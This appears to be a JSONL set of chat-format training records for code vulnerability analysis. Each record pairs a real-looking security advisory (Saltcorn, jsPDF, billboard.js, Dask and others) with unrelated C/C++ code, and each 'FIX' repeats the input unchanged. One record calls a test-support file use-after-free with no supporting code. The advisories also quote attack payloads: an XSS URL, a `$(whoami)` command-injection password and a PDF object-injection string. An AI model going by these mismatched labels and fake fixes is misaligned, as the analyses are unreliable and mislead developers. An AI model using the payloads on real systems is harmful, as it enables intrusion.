NULL;\n\tsize_t method_len = 0, iv_len = 0;\n\tconst EVP_CIPHER *cipher;\n\n\tif (zend_parse_parameters(ZEND_NUM_ARGS(), \"sz/sz|ss\", &data, &data_len, &opendata,\n\t\t\t\t&ekey, &ekey_len, &privkey, &method, &method_len, &iv, &iv_len) == FAILURE) {\n\t\treturn;\n\t}\n\n\tpkey = php_openssl_evp_from_zval(privkey, 0, \"\", 0, 0, &keyresource);\n\tif (pkey == NULL) {\n\t\tphp_error_docref(NULL, E_WARNING, \"unable to coerce parameter 4 into a private key\");\n\t\tRETURN_FALSE;\n\t}\n\n\tPHP_OPENSSL_CHECK_SIZE_T_TO_INT(ekey_len, ekey);\n\tPHP_OPENSSL_CHECK_SIZE_T_TO_INT(data_len, data);\n\n\tif (method) {\n\t\tcipher = EVP_get_cipherbyname(method);\n\t\tif (!cipher) {\n\t\t\tphp_error_docref(NULL, E_WARNING, \"Unknown signature algorithm.\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t} else {\n\t\tcipher = EVP_rc4();\n\t}\n\n\tcipher_iv_len = EVP_CIPHER_iv_length(cipher);\n\tif (cipher_iv_len > 0) {\n\t\tif (!iv) {\n\t\t\tphp_error_docref(NULL, E_WARNING,\n\t\t\t\t\t\"Cipher algorithm requires an IV to be supplied as a sixth parameter\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tif (cipher_iv_len != iv_len) {\n\t\t\tphp_error_docref(NULL, E_WARNING, \"IV length is invalid\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tiv_buf = (unsigned char *)iv;\n\t} else {\n\t\tiv_buf = NULL;\n\t}\n\n\tbuf = emalloc(data_len + 1);\n\n\tctx = EVP_CIPHER_CTX_new();\n\tif (ctx != NULL && EVP_OpenInit(ctx, cipher, (unsigned char *)ekey, (int)ekey_len, iv_buf, pkey) &&\n\t\t\tEVP_OpenUpdate(ctx, buf, &len1, (unsigned char *)data, (int)data_len) &&\n\t\t\tEVP_OpenFinal(ctx, buf + len1, &len2) && (len1 + len2 > 0)) {\n\t\tzval_dtor(opendata);\n\t\tbuf[len1 + len2] = '\\0';\n\t\tZVAL_NEW_STR(opendata, zend_string_init((char*)buf, len1 + len2, 0));\n\t\tRETVAL_TRUE;\n\t} else {\n\t\tRETVAL_FALSE;\n\t}\n\n\tefree(buf);\n\tif (keyresource == NULL) {\n\t\tEVP_PKEY_free(pkey);\n\t}\n\tEVP_CIPHER_CTX_free(ctx);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for billboard.js is vulnerable to XSS during chart option binding:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: billboard.js before 3.18.0 allows an attacker to execute malicious JavaScript due to improper sanitization during chart option binding.\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Saltcorn's Reflected XSS and Command Injection vulnerabilities can be chained for 1-click-RCE:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Summary\n1. There is a reflected XSS vulnerability in the GET /admin/edit-codepage/:name route through the name parameter. This can be used to hijack the session of an admin if they click a specially crafted link.\n2. Additionally, there is a Command Injection vulnerability in GET /admin/backup. The admin can inject a shell command in the backup password which is inserted in the command used to create the backup zip.\n\n\nBoth vulnerabilities can be chained to craft a malicious link which will execute an arbitrary shell command on the server if it is clicked by a saltcorn admin with an active session. I believe iframes could also be used to exploit this silently when the admin visits an attacker-controlled web page (though I have not tested that).\n\n### Details\n1. The XSS vulnerability is here: https://github.com/saltcorn/saltcorn/blob/020893c0001678fd5ebd2c088ba68b395de1aabc/packages/server/routes/admin.js#L4886-L4887 Specifically, the name parameter is inserted into the pages breadcrumbs without sanitization.\n2. The Command Injection happens here: https://github.com/saltcorn/saltcorn/blob/020893c0001678fd5ebd2c088ba68b395de1aabc/packages/saltcorn-admin-models/models/backup.ts#L381-L382\n\n### PoC\n1. A minimal PoC for the XSS can be as simple as: http://localhost:3000/admin/edit-codepage/%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%0A (assuming saltcorn running at localhost:3000 and the user having an active admin session)\n2. For the Command Injection, visit the backup section of saltcorn, set an admin password like `\";$(whoami);\"` (including the quotation marks) and then click \"Download a backup\" in the \"Manual backup\" section. This should display an error page saying that /bin/sh could not find the binary named \"root\" or \"saltcorn\", depending on the user.\n\nAn example of an exploit that chains both vulnerabilities and generates the aforementioned malicious link:\n[exploit.zip](https://github.com/user-attachments/files/24356819/exploit.zip)\n\n### Affected Versions\nEdit: The following Docker containers from docker hub were tested: 1.4.1, 1.4.0, 1.3.1, 1.3.0, 1.2.0, 1.1.2, 1.1.1, 1.0.0\nThe Command Injection is applicable to versions >= 1.3.0.\nThe XSS is applicable to versions >= 1.1.1\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Craft CMS vulnerable to potential information disclosure via unchecked asset relocation:\n\nvoid LockScreenMediaControlsView::UpdateDrag(\n    const gfx::Point& location_in_screen) {\n  is_in_drag_ = true;\n  int drag_delta = location_in_screen.y() - initial_drag_point_.y();\n\n  if (contents_view_->bounds().bottom() + drag_delta >=\n      GetLocalBounds().bottom()) {\n    return;\n  }\n\n  gfx::Transform transform;\n  transform.Translate(0, drag_delta);\n  contents_view_->layer()->SetTransform(transform);\n  UpdateOpacity();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-200\nREASON: Authenticated users on a Craft installation could potentially expose sensitive assets via their user profile photo via maliciously crafted requests.\n\nUsers should update to the patched versions (5.8.21 and 4.16.17) to mitigate the issue.\n\nResources:\n\nhttps://github.com/craftcms/cms/commit/4bcb0db554e273b66ce3b75263a13414c2368fc9\n\nhttps://github.com/craftcms/cms/commit/4bcb0db554e273b66ce3b75263a13414c2368fc9\nFIX:\nvoid LockScreenMediaControlsView::UpdateDrag(\n    const gfx::Point& location_in_screen) {\n  is_in_drag_ = true;\n  int drag_delta = location_in_screen.y() - initial_drag_point_.y();\n\n  if (contents_view_->bounds().bottom() + drag_delta >=\n      GetLocalBounds().bottom()) {\n    return;\n  }\n\n  gfx::Transform transform;\n  transform.Translate(0, drag_delta);\n  contents_view_->layer()->SetTransform(transform);\n  UpdateOpacity();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: ### Impact\n\nUser control of the argument of the `addJS` method allows an attacker to inject arbitrary PDF objects into the generated document. By crafting a payload that escapes the JavaScript string delimiter, an attacker can execute malicious actions or alter the document structure, impacting any user who opens the generated PDF.\n\n```js\nimport { jsPDF } from \"jspdf\";\nconst doc = new jsPDF();\n// Payload:\n// 1. ) closes the JS string.\n// 2. > closes the current dictionary.\n// 3. /AA ... injects an \"Additional Action\" that executes on focus/open.\nconst maliciousPayload = \"console.log('test');) >> /AA << /O << /S /JavaScript /JS (app.alert('Hacked!')) >> >>\";\n\ndoc.addJS(maliciousPayload);\ndoc.save(\"vulnerable.pdf\");\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.2.0.\n\n### Workarounds\nEscape parentheses in user-provided JavaScript code before passing them to the `addJS` method.\n### References\nhttps://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"use_after_free\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code uses memory after it has been freed. This can lead to crashes, data corruption, or arbitrary code execution if an attacker can control the freed memory.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, privilege escalation\",\n  \"compliant_patch\": \"\\n// FIXED: Nullify pointers after free and check before use\\n// Instead of: free(ptr); ... use(ptr);\\n// Use: free(ptr); ptr = NULL; ... if (ptr) use(ptr);\\n\\n// Better: restructure code to avoid dangling pointers\\n// Use smart pointers or automatic memory management\\n\",\n  \"source\": \"SARD-240393\",\n  \"cwe\": \"CWE-416\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for OpenClaw affected by potential code execution via unsafe hook module path handling in Gateway:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ## Summary\n\nOpenClaw Gateway supports hook mappings with optional JavaScript/TypeScript transform modules. In affected versions, the gateway did not sufficiently constrain configured module paths before passing them to dynamic `import()`. Under some configurations, a user who can modify gateway configuration could cause the gateway process to load and execute an unintended local module.\n\n## Impact\n\nPotential code execution in the OpenClaw gateway Node.js process.\n\nThis requires access that can modify gateway configuration (for example via the gateway config endpoints). Treat such access as high privilege.\n\n## Affected Packages / Versions\n\n- npm package: `openclaw`\n- Affected: `>= 2026.1.5` and `<= 2026.2.13`\n\n## Patched Versions\n\n- `>= 2026.2.14`\n\n## Fix Commit(s)\n\n- `a0361b8ba959e8506dc79d638b6e6a00d12887e4` (restrict hook transform module loading)\n- `35c0e66ed057f1a9f7ad2515fdcef516bd6584ce` (harden hooks module loading)\n\n## Mitigation\n\n- Upgrade to `2026.2.14` or newer.\n- Avoid exposing gateway configuration endpoints to untrusted networks.\n- Review config for unsafe values:\n  - `hooks.mappings[].transform.module`\n  - `hooks.internal.handlers[].module`\n\nThanks @222n5 for reporting.\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for aircompressor Snappy and LZ4 Java-based decompressor implementation can leak information from reused output buffer:\n\nint git_pkt_parse_line(\n\tgit_pkt **head, const char *line, const char **out, size_t bufflen)\n{\n\tint ret;\n\tint32_t len;\n\n\t/* Not even enough for the length */\n\tif (bufflen > 0 && bufflen < PKT_LEN_SIZE)\n\t\treturn GIT_EBUFS;\n\n\tlen = parse_len(line);\n\tif (len < 0) {\n\t\t/*\n\t\t * If we fail to parse the length, it might be because the\n\t\t * server is trying to send us the packfile already.\n\t\t */\n\t\tif (bufflen >= 4 && !git__prefixcmp(line, \"PACK\")) {\n\t\t\tgiterr_clear();\n\t\t\t*out = line;\n\t\t\treturn pack_pkt(head);\n\t\t}\n\n\t\treturn (int)len;\n\t}\n\n\t/*\n\t * If we were given a buffer length, then make sure there is\n\t * enough in the buffer to satisfy this line\n\t */\n\tif (bufflen > 0 && bufflen < (size_t)len)\n\t\treturn GIT_EBUFS;\n\n\t/*\n\t * The length has to be exactly 0 in case of a flush\n\t * packet or greater than PKT_LEN_SIZE, as the decoded\n\t * length includes its own encoded length of four bytes.\n\t */\n\tif (len != 0 && len < PKT_LEN_SIZE)\n\t\treturn GIT_ERROR;\n\n\tline += PKT_LEN_SIZE;\n\t/*\n\t * The Git protocol does not specify empty lines as part\n\t * of the protocol. Not knowing what to do with an empty\n\t * line, we should return an error upon hitting one.\n\t */\n\tif (len == PKT_LEN_SIZE) {\n\t\tgiterr_set_str(GITERR_NET, \"Invalid empty packet\");\n\t\treturn GIT_ERROR;\n\t}\n\n\tif (len == 0) { /* Flush pkt */\n\t\t*out = line;\n\t\treturn flush_pkt(head);\n\t}\n\n\tlen -= PKT_LEN_SIZE; /* the encoded length includes its own size */\n\n\tif (*line == GIT_SIDE_BAND_DATA)\n\t\tret = data_pkt(head, line, len);\n\telse if (*line == GIT_SIDE_BAND_PROGRESS)\n\t\tret = sideband_progress_pkt(head, line, len);\n\telse if (*line == GIT_SIDE_BAND_ERROR)\n\t\tret = sideband_error_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ACK\"))\n\t\tret = ack_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"NAK\"))\n\t\tret = nak_pkt(head);\n\telse if (!git__prefixcmp(line, \"ERR \"))\n\t\tret = err_pkt(head, line, len);\n\telse if (*line == '#')\n\t\tret = comment_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ok\"))\n\t\tret = ok_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ng\"))\n\t\tret = ng_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"unpack\"))\n\t\tret = unpack_pkt(head, line, len);\n\telse\n\t\tret = ref_pkt(head, line, len);\n\n\t*out = line + len;\n\n\treturn ret;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-125\nREASON: ### Summary\nIncorrect handling of malformed data in Java-based decompressor implementations for Snappy and LZ4 allows remote attackers to read previous buffer contents via crafted compressed input. In applications where the output buffer is reused without being cleared, this may lead to disclosure of sensitive data.\n\n### Details\nWith certain crafted compressed inputs, elements from the output buffer can end up in the uncompressed output. This is relevant for applications that reuse the same output buffer to uncompress multiple inputs. This can be the case of a web server that allocates a fix-sized buffer for performance purposes. This is similar to [GHSA-cmp6-m4wj-q63q](https://github.com/yawkat/lz4-java/security/advisories/GHSA-cmp6-m4wj-q63q).\n\n### Impact\nApplications using aircompressor as described above may leak sensitive information to external unauthorized attackers.\n\n### Mitigation\n\nThe vulnerability is fixed in release 3.4 and 2.0.3. However, it can be mitigated by either:\n* Avoiding reuse of the decompression buffer across calls\n* Clearing the decompression buffer before a call to decompress data\nFIX:\nint git_pkt_parse_line(\n\tgit_pkt **head, const char *line, const char **out, size_t bufflen)\n{\n\tint ret;\n\tint32_t len;\n\n\t/* Not even enough for the length */\n\tif (bufflen > 0 && bufflen < PKT_LEN_SIZE)\n\t\treturn GIT_EBUFS;\n\n\tlen = parse_len(line);\n\tif (len < 0) {\n\t\t/*\n\t\t * If we fail to parse the length, it might be because the\n\t\t * server is trying to send us the packfile already.\n\t\t */\n\t\tif (bufflen >= 4 && !git__prefixcmp(line, \"PACK\")) {\n\t\t\tgiterr_clear();\n\t\t\t*out = line;\n\t\t\treturn pack_pkt(head);\n\t\t}\n\n\t\treturn (int)len;\n\t}\n\n\t/*\n\t * If we were given a buffer length, then make sure there is\n\t * enough in the buffer to satisfy this line\n\t */\n\tif (bufflen > 0 && bufflen < (size_t)len)\n\t\treturn GIT_EBUFS;\n\n\t/*\n\t * The length has to be exactly 0 in case of a flush\n\t * packet or greater than PKT_LEN_SIZE, as the decoded\n\t * length includes its own encoded length of four bytes.\n\t */\n\tif (len != 0 && len < PKT_LEN_SIZE)\n\t\treturn GIT_ERROR;\n\n\tline += PKT_LEN_SIZE;\n\t/*\n\t * The Git protocol does not specify empty lines as part\n\t * of the protocol. Not knowing what to do with an empty\n\t * line, we should return an error upon hitting one.\n\t */\n\tif (len == PKT_LEN_SIZE) {\n\t\tgiterr_set_str(GITERR_NET, \"Invalid empty packet\");\n\t\treturn GIT_ERROR;\n\t}\n\n\tif (len == 0) { /* Flush pkt */\n\t\t*out = line;\n\t\treturn flush_pkt(head);\n\t}\n\n\tlen -= PKT_LEN_SIZE; /* the encoded length includes its own size */\n\n\tif (*line == GIT_SIDE_BAND_DATA)\n\t\tret = data_pkt(head, line, len);\n\telse if (*line == GIT_SIDE_BAND_PROGRESS)\n\t\tret = sideband_progress_pkt(head, line, len);\n\telse if (*line == GIT_SIDE_BAND_ERROR)\n\t\tret = sideband_error_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ACK\"))\n\t\tret = ack_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"NAK\"))\n\t\tret = nak_pkt(head);\n\telse if (!git__prefixcmp(line, \"ERR \"))\n\t\tret = err_pkt(head, line, len);\n\telse if (*line == '#')\n\t\tret = comment_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ok\"))\n\t\tret = ok_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"ng\"))\n\t\tret = ng_pkt(head, line, len);\n\telse if (!git__prefixcmp(line, \"unpack\"))\n\t\tret = unpack_pkt(head, line, len);\n\telse\n\t\tret = ref_pkt(head, line, len);\n\n\t*out = line + len;\n\n\treturn ret;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Duplicate Advisory: Remote code execution in dask:\n\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-668\nREASON: ## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-hwqr-f3v9-hwxr. This link is maintained to preserve external references.\n\n## Original Description\nAn issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution.\nFIX:\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}]}
